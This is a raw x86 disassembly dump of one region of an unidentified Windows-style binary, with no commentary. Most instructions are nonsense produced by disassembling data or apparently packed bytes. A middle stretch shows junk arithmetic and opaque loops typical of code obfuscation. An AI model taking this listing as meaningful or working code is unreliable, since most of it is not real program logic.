  4141fe:	cmp    cl,BYTE PTR [edi+0x25]
  414201:	sbb    eax,0x51e369f7
  414206:	call   0x625f:0xa71d0f40
  41420d:	push   cs
  41420e:	or     edx,ecx
  414210:	lahf   
  414211:	adc    BYTE PTR [edx-0x1689417c],0x46
  414218:	int    0x6b
  41421a:	out    0xdb,eax
  41421c:	loope  0x4141fe
  41421e:	mov    ebx,0x56265b70
  414223:	loop   0x414239
  414225:	and    cl,0xf4
  414228:	loop   0x4141f4
  41422a:	pop    ds
  41422b:	aaa    
  41422c:	scas   eax,DWORD PTR es:[edi]
  41422d:	push   ebp
  41422e:	and    esi,DWORD PTR [eax+0x1c]
  414231:	mov    al,ds:0x8c4854a3
  414236:	nop
  414237:	mov    eax,0x2b07d525
  41423c:	jg     0x414265
  41423e:	lods   eax,DWORD PTR ds:[esi]
  41423f:	mov    bh,0xc2
  414241:	cmp    DWORD PTR [eax],ecx
  414243:	fild   DWORD PTR ds:0x1f8d9ebb
  414249:	mov    edx,0x97289aab
  41424e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41424f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414250:	in     al,dx
  414251:	les    esi,FWORD PTR [edx-0xf]
  414254:	mov    BYTE PTR [edx+0xb],dh
  414257:	jmp    0x1bb21e49
  41425c:	bound  ebx,QWORD PTR [edx]
  41425e:	add    ebx,DWORD PTR [ebp-0x1a]
  414261:	mov    esp,0x3b03edb7
  414266:	mov    eax,0x6066ba8
  41426b:	mov    esi,DWORD PTR [edi]
  41426d:	xlat   BYTE PTR ds:[ebx]
  41426e:	mov    dh,0x28
  414270:	arpl   WORD PTR [ebx+ebx*4],di
  414273:	dec    esi
  414274:	sub    ebp,DWORD PTR [edx-0x3dcaf5db]
  41427a:	fldcw  WORD PTR [ecx-0x56]
  41427d:	fld    QWORD PTR [edi+ebx*2+0x6ce7b3ae]
  414284:	xlat   BYTE PTR ds:[ebx]
  414285:	stos   DWORD PTR es:[edi],eax
  414286:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  414288:	jge    0x41422c
  41428a:	xlat   BYTE PTR ds:[ebx]
  41428b:	(bad)  [ecx]
  41428d:	mov    edx,0xa71643ec
  414292:	mov    edx,0x2338733d
  414297:	loop   0x4142d8
  414299:	fisub  DWORD PTR [eax-0x78]
  41429c:	ds pop esi
  41429e:	call   FWORD PTR [ebx]
  4142a0:	sub    ebp,DWORD PTR [ecx-0x75]
  4142a3:	xor    DWORD PTR [ebp+edx*4-0x62f798e1],ebp
  4142aa:	push   ebp
  4142ab:	scas   eax,DWORD PTR es:[edi]
  4142ac:	xor    ebx,edi
  4142ae:	xchg   esp,eax
  4142af:	test   DWORD PTR [ecx-0x59db8e67],edx
  4142b5:	xor    al,0x79
  4142b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142b8:	enter  0xe729,0xf9
  4142bc:	xchg   DWORD PTR [edi+edx*2+0x6758ff64],ecx
  4142c3:	xchg   ecx,eax
  4142c4:	lods   eax,DWORD PTR ds:[esi]
  4142c5:	mov    dl,BYTE PTR [edi]
  4142c7:	aas    
  4142c8:	lds    edi,FWORD PTR [esi+eax*8+0x2115a891]
  4142cf:	(bad)  
  4142d0:	mov    eax,ds:0xe886d016
  4142d5:	or     al,0x70
  4142d7:	ins    BYTE PTR es:[edi],dx
  4142d8:	stos   BYTE PTR es:[edi],al
  4142d9:	cmp    al,0x46
  4142db:	ss cmp ch,ch
  4142de:	(bad)  
  4142e0:	sub    ah,bl
  4142e2:	add    BYTE PTR [edx+ebp*2],dl
  4142e5:	jne    0x4142e2
  4142e7:	fadd   QWORD PTR [ebx-0x27f4016a]
  4142ed:	das    
  4142ee:	addr16 xchg esi,eax
  4142f0:	ja     0x41428d
  4142f2:	xlat   BYTE PTR ds:[ebx]
  4142f3:	xor    ecx,eax
  4142f5:	sbb    eax,0x27bb60ee
  4142fa:	(bad)  
  4142fb:	add    edx,ebp
  4142fd:	jnp    0x41435d
  4142ff:	test   eax,0x86aa7c29
  414304:	cs iret 
  414306:	add    edi,DWORD PTR [esi+0x1b9dc692]
  41430c:	popa   
  41430d:	jne    0x4142b1
  41430f:	xchg   ecx,eax
  414310:	imul   eax
  414312:	sbb    BYTE PTR [ebp-0x15],ch
  414315:	xor    eax,0xc54a4319
  41431a:	sub    edx,ebx
  41431c:	sbb    DWORD PTR ds:0x428647,edi
  414322:	sub    edx,esi
  414324:	add    DWORD PTR ds:0x42863f,ecx
  41432a:	xor    edx,eax
  41432c:	mov    ebx,DWORD PTR ds:0x42864f
  414332:	add    DWORD PTR ds:0x428623,ebx
  414338:	mov    DWORD PTR [ebp+0x8],edx
  41433b:	mov    edx,DWORD PTR [ebp+0x8]
  41433e:	inc    ebx
  41433f:	mov    ebx,DWORD PTR [ebp-0x58]
  414342:	sub    DWORD PTR ds:0x428663,0x42863f
  41434c:	add    edx,0x5708f1
  414352:	and    DWORD PTR ds:0x428647,0x6a8d
  41435c:	imul   edx,ebx
  41435f:	xor    ebx,ebx
  414361:	or     ebx,DWORD PTR ds:0x42861f
  414367:	adc    DWORD PTR ds:0x42860f,ebx
  41436d:	mov    DWORD PTR [ebp-0x58],edx
  414370:	mov    edx,DWORD PTR [ebp+0x8]
  414373:	mov    ebx,DWORD PTR [ebp-0x54]
  414376:	add    edx,0x64f893
  41437c:	sbb    DWORD PTR ds:0x4285ff,0x4a3d
  414386:	or     edx,ebx
  414388:	mov    DWORD PTR [ebp-0x54],edx
  41438b:	or     DWORD PTR ds:0x4285db,edx
  414391:	mov    edx,DWORD PTR [ebp+0x8]
  414394:	mov    DWORD PTR ds:0x428653,0x1a
  41439e:	cmp    DWORD PTR ds:0x428653,0x0
  4143a5:	je     0x4143df
  4143ab:	cmp    DWORD PTR ds:0x428653,0x25
  4143b2:	ja     0x4143df
  4143b8:	jmp    0x4143cd
  4143bd:	push   0x428034
  4143c2:	push   0x0
  4143c4:	push   DWORD PTR [ebp-0xc]
  4143c7:	call   DWORD PTR ds:0x4287ab
  4143cd:	mov    ebx,DWORD PTR ds:0x428653
  4143d3:	dec    ebx
  4143d4:	mov    DWORD PTR ds:0x428653,ebx
  4143da:	jmp    0x41439e
  4143df:	mov    ebx,DWORD PTR [ebp-0x50]
  4143e2:	add    DWORD PTR ds:0x42862f,0x3490
  4143ec:	add    edx,ecx
  4143ee:	xor    edx,ebx
  4143f0:	sbb    DWORD PTR ds:0x4285f3,edi
  4143f6:	mov    DWORD PTR [ebp-0x50],edx
  4143f9:	mov    edx,DWORD PTR [ebp+0x8]
  4143fc:	mov    ebx,DWORD PTR [ebp-0x4c]
  4143ff:	add    edx,edi
  414401:	add    DWORD PTR ds:0x42866b,0x26d2
  41440b:	and    edx,ebx
  41440d:	mov    DWORD PTR [ebp-0x4c],edx
  414410:	and    DWORD PTR ds:0x42862b,0x0
  41441a:	xor    edx,edx
  41441c:	xor    edx,DWORD PTR ds:0x42862b
  414422:	inc    edx
  414423:	mov    DWORD PTR ds:0x42862b,edx
  414429:	cmp    DWORD PTR ds:0x42862b,0x2c
  414430:	jbe    0x414453
  414436:	jmp    0x414446
  41443b:	push   0x42808e
  414440:	call   DWORD PTR ds:0x4287af
  414446:	cmp    DWORD PTR ds:0x42862b,0x1f
  41444d:	jb     0x41441a
  414453:	mov    edx,DWORD PTR [ebp+0x8]
  414456:	mov    ebx,DWORD PTR [ebp-0x48]
  414459:	lea    edx,[ebx+edx*1+0x241fcde]
  414460:	mov    DWORD PTR [ebp-0x48],edx
  414463:	mov    edx,DWORD PTR [ebp+0x8]
  414466:	mov    ebx,0xfa5e1521
  41446b:	sub    ebx,edx
  41446d:	add    ebx,DWORD PTR [ebp-0x44]
  414470:	mov    DWORD PTR [ebp-0x44],ebx
  414473:	mov    edx,DWORD PTR [ebp+0x8]
  414476:	xor    edx,eax
  414478:	add    edx,esi
  41447a:	jne    0x411f5b
  414480:	mov    edx,DWORD PTR [ebp-0xc]
  414483:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41448a:	mov    bl,BYTE PTR [ebp-0x1]
  41448d:	cmp    dl,bl
  41448f:	je     0x41b050
  414495:	mov    ecx,DWORD PTR [ebp-0x5c]
  414498:	mov    edx,DWORD PTR [ebp-0xc]
  41449b:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4144a2:	mov    ebx,DWORD PTR [ebp+0xc]
  4144a5:	xor    ecx,eax
  4144a7:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272ec]
  4144ae:	jne    0x41b184
  4144b4:	mov    ecx,DWORD PTR [ebp-0x5c]
  4144b7:	mov    edx,DWORD PTR [ebp+0xc]
  4144ba:	xor    ecx,eax
  4144bc:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272ec]
  4144c4:	mov    edx,DWORD PTR [ebp-0x18]
  4144c7:	xor    edx,eax
  4144c9:	add    edx,esi
  4144cb:	cmp    ecx,edx
  4144cd:	mov    ecx,DWORD PTR [ebp-0x14]
  4144d0:	mov    DWORD PTR [ebp+0x8],ecx
  4144d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4144d6:	je     0x41d62d
  4144dc:	xor    ecx,eax
  4144de:	add    ecx,esi
  4144e0:	mov    ecx,0x242ebcc
  4144e5:	je     0x41b0d8
  4144eb:	mov    edx,DWORD PTR [ebp+0x8]
  4144ee:	mov    ebx,DWORD PTR [ebp-0x8]
  4144f1:	xor    edx,eax
  4144f3:	xor    ebx,eax
  4144f5:	sub    edx,ebx
  4144f7:	sub    edx,esi
  4144f9:	xor    edx,eax
  4144fb:	mov    DWORD PTR [ebp+0x8],edx
  4144fe:	mov    edx,DWORD PTR [ebp+0x8]
  414501:	mov    ebx,DWORD PTR [ebp-0x58]
  414504:	add    edx,0x5708f1
  41450a:	imul   edx,ebx
  41450d:	jmp    0x4168ae
  414512:	dec    eax
  414513:	pop    DWORD PTR [eax+ebx*8-0x70f72485]
  41451a:	lea    ebx,[eax-0x3a]
  41451d:	push   edi
  41451e:	loop   0x41457f
  414520:	fadd   st,st(5)
  414522:	cmp    ah,BYTE PTR [esi+0x7d]
  414525:	jp     0x414525
  414527:	pop    edi
  414528:	jp     0x4145a4
  41452a:	dec    ebp
  41452b:	mov    WORD PTR [ecx+0x4800c0eb],?
  414531:	jl     0x414503
  414533:	mov    edi,0x629d4d92
  414538:	push   ecx
  414539:	mov    ds:0xbbb4575c,al
  41453e:	aas    
  41453f:	jp     0x41459c
  414541:	cli    
  414542:	jmp    0x9f7e:0xd65c7629
  414549:	add    DWORD PTR [esp+ebp*2+0x3a],edi
  41454d:	push   eax
  41454e:	or     BYTE PTR [edx],al
  414550:	popf   
  414551:	jnp    0x414506
  414553:	sub    dl,bl
  414555:	js     0x414575
  414557:	lahf   
  414558:	cdq    
  414559:	ins    BYTE PTR es:[edi],dx
  41455a:	jno    0x4145cc
  41455c:	inc    edx
  41455d:	pop    ds
  41455e:	leave  
  41455f:	nop
  414560:	ds cdq 
  414562:	dec    ecx
  414563:	out    0x7e,al
  414565:	xlat   BYTE PTR ds:[ebx]
  414566:	popf   
  414567:	jl     0x4145b6
  414569:	neg    esp
  41456b:	mul    DWORD PTR [edi+0x118c4a05]
  414571:	or     al,0x6
  414573:	outs   dx,DWORD PTR ds:[esi]
  414574:	cmp    DWORD PTR [ecx-0x40],edx
  414577:	jno    0x4145cf
  414579:	pop    ebp
  41457a:	icebp  
  41457b:	and    edx,DWORD PTR [esi+0x5]
  41457e:	xor    DWORD PTR [ebx-0x58],ebp
  414581:	adc    esi,DWORD PTR [ecx-0x8]
  414584:	jo     0x4145c0
  414586:	inc    ecx
  414587:	xchg   BYTE PTR [edi+0x2],al
  41458a:	or     al,BYTE PTR [ecx+eiz*2]
  41458d:	xor    al,0xe8
  41458f:	xor    esi,eax
  414591:	push   ss
  414592:	ss in  al,0x63
  414595:	xor    edx,DWORD PTR [eax]
  414597:	ficomp WORD PTR fs:[ebx]
  41459a:	xor    esp,ebx
  41459c:	stc    
  41459d:	inc    edi
  41459e:	pop    es
  41459f:	mov    ah,0x71
  4145a1:	inc    ebp
  4145a2:	loop   0x4145c4
  4145a4:	in     al,0x63
  4145a6:	inc    edi
  4145a7:	xor    DWORD PTR [esi],ebx
  4145a9:	cld    
  4145aa:	inc    esi
  4145ab:	xchg   edi,eax
  4145ac:	and    BYTE PTR [edi],cl
  4145ae:	dec    ebp
  4145af:	ins    BYTE PTR es:[edi],dx
  4145b0:	push   ds
  4145b1:	ja     0x4145ac
  4145b3:	retf   0x661b
  4145b6:	jb     0x41454c
  4145b8:	clc    
  4145b9:	jmp    0x414559
  4145bb:	fdivr  QWORD PTR [edx-0x73]
  4145be:	or     eax,0x1816c6f4
  4145c3:	inc    esp
  4145c4:	push   0x53
  4145c6:	icebp  
  4145c7:	stc    
  4145c8:	enter  0x8d6f,0x65
  4145cc:	jo     0x41462a
  4145ce:	sbb    cl,BYTE PTR [esi]
  4145d0:	retf   
  4145d1:	pop    ecx
  4145d2:	push   eax
  4145d3:	mov    ecx,DWORD PTR [eax]
  4145d5:	cli    
  4145d6:	out    0x32,al
  4145d8:	fldenv [ecx+0x30]
  4145db:	or     ch,dh
  4145dd:	fmul   DWORD PTR [esi-0x1e]
  4145e0:	jne    0x4145a8
  4145e2:	or     DWORD PTR [ebx+0x32],esp
  4145e5:	xor    dh,dl
  4145e7:	pop    eax
  4145e8:	xchg   edx,eax
  4145e9:	adc    BYTE PTR [ecx+0x61],0x7
  4145ed:	lahf   
  4145ee:	shl    DWORD PTR [edi+0x5f],cl
  4145f1:	push   ss
  4145f2:	ins    DWORD PTR es:[edi],dx
  4145f3:	rcr    dl,1
  4145f5:	sub    ebx,edx
  4145f7:	dec    esp
  4145f8:	es adc eax,0x98b937e3
  4145fe:	ja     0x414620
  414600:	aam    0x6b
  414602:	out    0x6e,eax
  414604:	lods   al,BYTE PTR ds:[esi]
  414605:	inc    eax
  414606:	push   ecx
  414607:	xor    DWORD PTR [ebx+0x7b3bf33d],edi
  41460d:	mov    ah,0xb5
  41460f:	into   
  414610:	or     esi,esp
  414612:	je     0x414609
  414614:	push   ebx
  414615:	dec    esi
  414616:	mov    bl,0xe1
  414618:	mov    ds:0x332be0a3,eax
  41461d:	push   edi
  41461e:	test   al,0x53
  414620:	mov    al,ds:0xfe5c3a6d
  414625:	push   esi
  414626:	out    dx,al
  414627:	pop    ds
  414628:	inc    edi
  414629:	cmp    ebp,DWORD PTR [ebx+0x4a]
  41462c:	sbb    eax,0x214c72ee
  414631:	mov    ds:0xf8f0345f,al
  414636:	inc    esi
  414637:	enter  0x2f33,0x42
  41463b:	dec    esp
  41463c:	shl    BYTE PTR [ebx],cl
  41463e:	loope  0x414694
  414640:	jg     0x414682
  414642:	adc    eax,0x2dcdd6c2
  414647:	div    DWORD PTR [ecx-0x6a332ed]
  41464d:	xchg   edx,eax
  41464e:	xchg   ebp,eax
  41464f:	dec    ebp
  414650:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414651:	pop    ebx
  414652:	or     BYTE PTR [esi+0x34],0x96
  414656:	enter  0x326f,0xc2
  41465a:	mov    bh,0x81
  41465c:	cmc    
  41465d:	push   edi
  41465e:	stos   BYTE PTR es:[edi],al
  41465f:	out    0x11,eax
  414661:	(bad)  
  414662:	mov    esi,0x37990f46
  414667:	addr16 nop
  414669:	pop    esi
  41466a:	push   eax
  41466b:	cs (bad) 
  41466e:	xchg   edx,eax
  41466f:	es iretw 
  414672:	dec    esi
  414673:	fisttp DWORD PTR [esi]
  414675:	pop    eax
  414676:	data16 and bl,BYTE PTR [esi+0x5b44219c]
  41467d:	cmp    BYTE PTR [edi],bl
  41467f:	dec    ebp
  414680:	arpl   WORD PTR [ecx+0x33],cx
  414683:	and    al,0x50
  414685:	sbb    esi,0x6e
  414688:	lea    esp,ds:0xfd4c4a75
  41468e:	cmp    al,0x4a
  414690:	mov    eax,ds:0x9068f5bf
  414695:	jmp    0x804276
  41469a:	sbb    edi,DWORD PTR [ebx]
  41469c:	sbb    bh,BYTE PTR [eax]
  41469e:	pop    esi
  41469f:	jmp    0x4c946754
  4146a4:	das    
  4146a5:	cli    
  4146a6:	pop    ecx
  4146a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146a8:	adc    BYTE PTR [ebx-0x5ecdcc45],dl
  4146ae:	xor    al,0xea
  4146b0:	out    dx,eax
  4146b1:	out    dx,eax
  4146b2:	aad    0x1
  4146b4:	xchg   edx,eax
  4146b5:	mov    eax,cs:0x5c156b94
  4146bb:	fwait
  4146bc:	mov    esi,0x59fa7b0b
  4146c1:	mov    bl,0xbf
  4146c3:	adc    eax,0x1d67ceba
  4146c8:	adc    eax,0x63d3e236
  4146cd:	adc    eax,0x7f9658cb
  4146d2:	jecxz  0x414710
  4146d4:	and    al,0x9
  4146d6:	pop    ss
  4146d7:	or     dh,cl
  4146d9:	push   cs
  4146da:	cmp    DWORD PTR [esi],0x57
  4146dd:	jmp    0x4146e2
  4146df:	(bad)  
  4146e0:	cdq    
  4146e1:	imul   esp,ecx,0xe216621f
  4146e7:	jno    0x41471d
  4146e9:	add    dl,BYTE PTR [esi+0x15]
  4146ec:	lods   al,BYTE PTR ds:[esi]
  4146ed:	daa    
  4146ee:	test   al,0x1
  4146f0:	es push edi
  4146f2:	xchg   BYTE PTR [ebp-0x34],bl
  4146f5:	push   edx
  4146f6:	out    0xbb,al
  4146f8:	inc    edx
  4146f9:	jecxz  0x414738
  4146fb:	das    
  4146fc:	fild   WORD PTR ds:0x900d5f33
  414702:	aas    
  414703:	inc    esp
  414704:	sub    al,0x47
  414706:	lock cmp BYTE PTR [esi+0x5204b611],dh
  41470d:	mov    edx,0x25130f12
  414712:	lods   eax,DWORD PTR ds:[esi]
  414713:	mov    ebp,0xf8a56985
  414718:	adc    al,0x6b
  41471a:	jmp    0xc6a824ff
  41471f:	mov    esp,0x20b8e015
  414724:	popf   
  414725:	mov    ecx,0x94bcf716
  41472a:	pop    ebp
  41472b:	sbb    al,0x15
  41472d:	mov    eax,0x1b49b0fb
  414732:	sahf   
  414733:	adc    DWORD PTR [esi],0x1f8784ca
  414739:	add    BYTE PTR [edi+0x23],ch
  41473c:	ds inc ebx
  41473e:	xor    eax,0xe3509d3c
  414743:	xor    al,0xcd
  414745:	clc    
  414746:	scas   eax,DWORD PTR es:[edi]
  414747:	cli    
  414748:	lock and edi,DWORD PTR [esi]
  41474b:	xor    BYTE PTR [ebx+eiz*1-0x16],dl
  41474f:	inc    ebx
  414750:	xchg   esi,eax
  414751:	rcr    BYTE PTR [edi-0x4186d41d],1
  414757:	push   esi
  414758:	add    BYTE PTR [edx+0x40e0e4c3],ah
  41475e:	pushf  
  41475f:	dec    edi
  414760:	dec    edi
  414761:	push   ss
  414762:	mov    bl,BYTE PTR [edx-0x61fcd386]
  414768:	sub    ebx,DWORD PTR [ebp+0xb]
  41476b:	sbb    esi,DWORD PTR [edi]
  41476d:	xchg   ebp,eax
  41476e:	rcr    DWORD PTR [eax],1
  414770:	xchg   ecx,eax
  414771:	dec    ebp
  414772:	fdivr  DWORD PTR [edx-0x5f17ab08]
  414778:	nop
  414779:	in     eax,dx
  41477a:	jne    0x414741
  41477c:	(bad)  
  41477d:	out    0x32,eax
  41477f:	mov    al,ds:0xbf75767c
  414784:	fsub   st,st(6)
  414786:	cld    
  414787:	fsubr  st,st(4)
  414789:	aad    0xaa
  41478b:	sbb    BYTE PTR [edx-0x29],bh
  41478e:	dec    eax
  41478f:	jmp    0x4147cb
  414791:	pop    es
  414792:	rcr    DWORD PTR [esi+0xcd7f095],1
  414798:	mov    WORD PTR ds:0xf9a41c21,?
  41479e:	xchg   BYTE PTR [ecx-0x46858e38],dl
  4147a4:	adc    ch,0x2
  4147a7:	retf   
  4147a8:	retf   
  4147a9:	jmp    0xf1f5:0xef3a769b
  4147b0:	sub    ecx,DWORD PTR fs:[ecx+edx*4+0x1facef7f]
  4147b8:	inc    eax
  4147b9:	mov    bl,0xeb
  4147bb:	into   
  4147bc:	dec    ebp
  4147bd:	jecxz  0x4147b8
  4147bf:	dec    esi
  4147c0:	scas   eax,DWORD PTR es:[edi]
  4147c1:	xor    al,0xc4
  4147c3:	inc    eax
  4147c4:	dec    ebx
  4147c5:	outs   dx,BYTE PTR ds:[esi]
  4147c6:	test   BYTE PTR [ebx],cl
  4147c8:	ret    
  4147c9:	and    esp,DWORD PTR [ebp-0x33]
  4147cc:	jle    0x4147fa
  4147ce:	mov    edi,0x3203139d
  4147d4:	cdq    
  4147d5:	adc    al,0x20
  4147d7:	scas   eax,DWORD PTR es:[edi]
  4147d8:	cld    
  4147d9:	or     eax,0x4ae724fe
  4147de:	mov    dh,0xeb
  4147e0:	test   BYTE PTR [ebp+0x2c59629b],ah
  4147e6:	add    ebp,ebx
  4147e8:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147ea:	mov    al,0xc9
  4147ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147ed:	cmp    dh,BYTE PTR [ecx]
  4147ef:	push   0x7737305a
  4147f4:	xor    ecx,DWORD PTR [esi-0x197dd1d8]
  4147fa:	dec    esi
  4147fb:	jg     0x41484a
  4147fd:	inc    edx
  4147fe:	mov    ch,0xb3
  414800:	fnop   
  414802:	adc    al,0xf5
  414804:	mov    ds:0x28150705,eax
  414809:	cmc    
  41480a:	jge    0x4147c2
  41480c:	(bad)  
  41480d:	test   al,0x40
  41480f:	cmp    eax,0x628c6209
  414814:	(bad)  
  414815:	mov    ebp,0x4c48c61e
  41481a:	hlt    
  41481b:	add    al,0x97
  41481d:	push   ebx
  41481e:	sti    
  41481f:	mov    dh,0x3d
  414821:	gs out 0x52,eax
  414824:	imul   edi,DWORD PTR [ebx],0xfecbd9b3
  41482a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41482b:	gs cli 
  41482d:	jo     0x4147d5
  41482f:	xor    bl,bh
  414831:	add    BYTE PTR [edi],bh
  414833:	lds    ebp,FWORD PTR [ebx]
  414835:	ja     0x414805
  414837:	mov    ch,BYTE PTR [ebx+0xb43e1ac]
  41483d:	lods   eax,DWORD PTR ds:[esi]
  41483e:	fsub   DWORD PTR ds:0x9e2e7ae4
  414844:	mov    bl,0x34
  414846:	aas    
  414847:	push   ss
  414848:	mov    eax,0x8f3a6ecc
  41484d:	jge    0x414824
  41484f:	test   ecx,ebp
  414851:	fs push 0x4e3aaf8
  414857:	mov    ebp,ss
  414859:	das    
  41485a:	inc    esp
  41485b:	adc    eax,0x4fdf97ee
  414860:	sub    DWORD PTR [edx+0x6a14bbd],0xffffff9a
  414867:	(bad)  
  414868:	and    DWORD PTR [edi-0x52],eax
  41486b:	std    
  41486c:	out    0x1f,al
  41486e:	push   esp
  41486f:	xlat   BYTE PTR ds:[ebx]
  414870:	lock xor ch,ch
  414873:	cmp    DWORD PTR [eax-0x6b04aac7],edx
  414879:	push   ebx
  41487a:	mov    ebp,0x990b7cb1
  41487f:	std    
  414880:	sbb    eax,0xaea83f7e
  414885:	xor    eax,eax
  414887:	jb     0x414883
  414889:	sub    ch,dl
  41488b:	cmp    DWORD PTR [ebp-0x3f],edi
  41488e:	fsubr  DWORD PTR [esi-0x30]
  414891:	lea    eax,[eax]
  414893:	mov    ecx,0x7ab35dc4
  414898:	loopne 0x414863
  41489a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41489b:	pop    es
  41489c:	xchg   ebp,eax
  41489d:	sub    DWORD PTR [edx-0x66703809],edi
  4148a3:	jp     0x4148a5
  4148a5:	push   esp
  4148a6:	sahf   
  4148a7:	mov    ds:0x3a0140c2,eax
  4148ac:	mov    BYTE PTR [edx],ah
  4148ae:	inc    esp
  4148af:	push   edx
  4148b0:	ja     0x41484d
  4148b2:	add    BYTE PTR [ecx+eax*2],dl
  4148b5:	mov    ecx,DWORD PTR [edi-0x6e0b2a28]
  4148bb:	mov    DWORD PTR [eax],esi
  4148bd:	call   0x8ef8:0x467ea0ca
  4148c4:	sbb    ecx,ecx
  4148c6:	jae    0x4148ba
  4148c8:	pusha  
  4148c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148ca:	mov    ebx,0x22957c7c
  4148cf:	loope  0x414854
  4148d1:	sub    al,0x36
  4148d3:	out    0xd5,eax
  4148d5:	aaa    
  4148d6:	mov    dh,0x73
  4148d8:	(bad)  
  4148db:	pop    ebx
  4148dc:	sbb    al,0x27
  4148de:	pop    es
  4148df:	sbb    esi,DWORD PTR [ebp-0x3a]
  4148e2:	xor    al,0x28
  4148e4:	push   ecx
  4148e5:	lods   eax,DWORD PTR ds:[esi]
  4148e6:	push   edi
  4148e7:	arpl   WORD PTR [edx+0x8204960],si
  4148ed:	xchg   esp,eax
  4148ee:	aam    0x4
  4148f0:	lahf   
  4148f1:	lahf   
  4148f2:	jnp    0x414946
  4148f4:	inc    ecx
  4148f5:	sbb    cl,al
  4148f7:	retf   0x80e9
  4148fa:	xchg   esi,eax
  4148fb:	pushf  
  4148fc:	add    cl,ch
  4148fe:	mov    dh,0x3d
  414900:	fidivr WORD PTR [edx+0x7dc99c3b]
  414906:	icebp  
  414907:	inc    ecx
  414908:	and    ecx,DWORD PTR ds:0x8708a963
  41490e:	in     eax,0x12
  414910:	jmp    0x41496c
  414912:	push   fs
  414914:	mov    al,0x71
  414916:	mov    eax,ds:0x5f45785
  41491b:	sub    edx,DWORD PTR [ecx-0xa005a16]
  414921:	sti    
  414922:	std    
  414923:	mov    eax,ds:0x11000e56
  414928:	mov    ecx,0x3d1110f8
  41492d:	in     al,0xc4
  41492f:	sbb    eax,0x2172dfb2
  414934:	not    esi
  414936:	mov    WORD PTR [eax+0x530236d6],?
  41493c:	fist   WORD PTR [eax]
  41493e:	inc    esp
  41493f:	xchg   edi,eax
  414940:	add    BYTE PTR [edi],bl
  414942:	hlt    
  414943:	inc    eax
  414944:	pop    ss
  414945:	out    0xe7,eax
  414947:	out    dx,eax
  414948:	fcomp  DWORD PTR [esi]
  41494a:	sub    eax,0x4a9b645f
  41494f:	fidiv  WORD PTR [ebx+0x4]
  414952:	daa    
  414953:	jmp    0x41497c
  414955:	add    dl,BYTE PTR [edi+0x30]
  414958:	and    dl,0x39
  41495b:	mov    edi,0xe26c35fa
  414960:	jo     0x41498b
  414962:	retf   
  414963:	lea    ebx,[ebp-0x60a846cc]
  414969:	mov    ch,bl
  41496b:	jmp    0x54e9:0x61ac746f
  414972:	xchg   edx,eax
  414973:	pop    esi
  414974:	cmp    eax,0x880851a5
  414979:	pop    esi
  41497a:	cdq    
  41497b:	out    0xc8,al
  41497d:	mov    ebp,edx
  41497f:	push   ds
  414980:	sti    
  414981:	leave  
  414982:	ss iret 
  414984:	add    cl,ch
  414986:	mov    edi,0xb2fc692b
  41498b:	aaa    
  41498c:	sahf   
  41498d:	cld    
  41498e:	(bad)  
  41498f:	jne    0x4149ec
  414991:	adc    esp,DWORD PTR [edx+edi*1-0x7b]
  414995:	xchg   edi,eax
  414996:	mov    eax,fs
  414998:	lods   eax,DWORD PTR ds:[esi]
  414999:	xchg   DWORD PTR [edx+0x4b],edi
  41499c:	pop    esi
  41499d:	push   cs
  41499e:	imul   ebp,DWORD PTR [esi],0x20
  4149a1:	lds    ebp,FWORD PTR [ebp+esi*8+0x569401bc]
  4149a8:	add    BYTE PTR [edx+0xcf1571e],al
  4149ae:	pop    ebx
  4149af:	ds test eax,0x31b4b06
  4149b5:	inc    esp
  4149b6:	xor    eax,0x9ec7a461
  4149bb:	sub    eax,0x1476a8de
  4149c0:	pop    cx
  4149c2:	aaa    
  4149c3:	jle    0x414954
  4149c5:	adc    bh,BYTE PTR ds:0x3c4832da
  4149cb:	jns    0x4149cf
  4149cd:	jle    0x414a43
  4149cf:	and    eax,0xc5f4cf9a
  4149d4:	daa    
  4149d5:	jge    0x4149df
  4149d7:	pusha  
  4149d8:	shr    DWORD PTR es:[edx],1
  4149db:	or     al,0xef
  4149dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149de:	adc    eax,0x7e4c281
  4149e3:	std    
  4149e4:	loop   0x414969
  4149e6:	adc    ah,0xdd
  4149e9:	lods   al,BYTE PTR ds:[esi]
  4149ea:	cmp    eax,0xe18165fc
  4149ef:	mul    DWORD PTR [edx-0x6d]
  4149f2:	repz inc ebx
  4149f4:	push   es
  4149f5:	lods   al,BYTE PTR ds:[esi]
  4149f6:	(bad)  
  4149f8:	mov    esi,0x2c629602
  4149fd:	(bad)  
  4149fe:	fst    QWORD PTR [eax]
  414a00:	pop    es
  414a01:	inc    esp
  414a02:	ins    BYTE PTR es:[edi],dx
  414a03:	and    DWORD PTR [ecx-0x46854559],0x7d2ca3c9
  414a0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a0e:	xchg   ebx,eax
  414a0f:	push   edx
  414a10:	aad    0x5a
  414a12:	add    edi,DWORD PTR [ecx]
  414a14:	mov    esi,ecx
  414a16:	pop    es
  414a17:	jmp    0x414a15
  414a19:	loopne 0x4149ad
  414a1b:	push   ss
  414a1c:	dec    edi
  414a1d:	test   BYTE PTR [ecx+0x1ba08710],0xa
  414a24:	xchg   BYTE PTR [ebp-0x700158ca],bh
  414a2a:	rcr    dh,0x1e
  414a2d:	outs   dx,BYTE PTR es:[esi]
  414a2f:	hlt    
  414a30:	xor    edi,DWORD PTR fs:[esi+0x59e0efb0]
  414a37:	ins    BYTE PTR es:[edi],dx
  414a38:	sti    
  414a39:	cmp    esi,edi
  414a3b:	outs   dx,DWORD PTR ds:[esi]
  414a3c:	ss xchg ecx,eax
  414a3e:	sub    BYTE PTR [esi+0x3c],0xb5
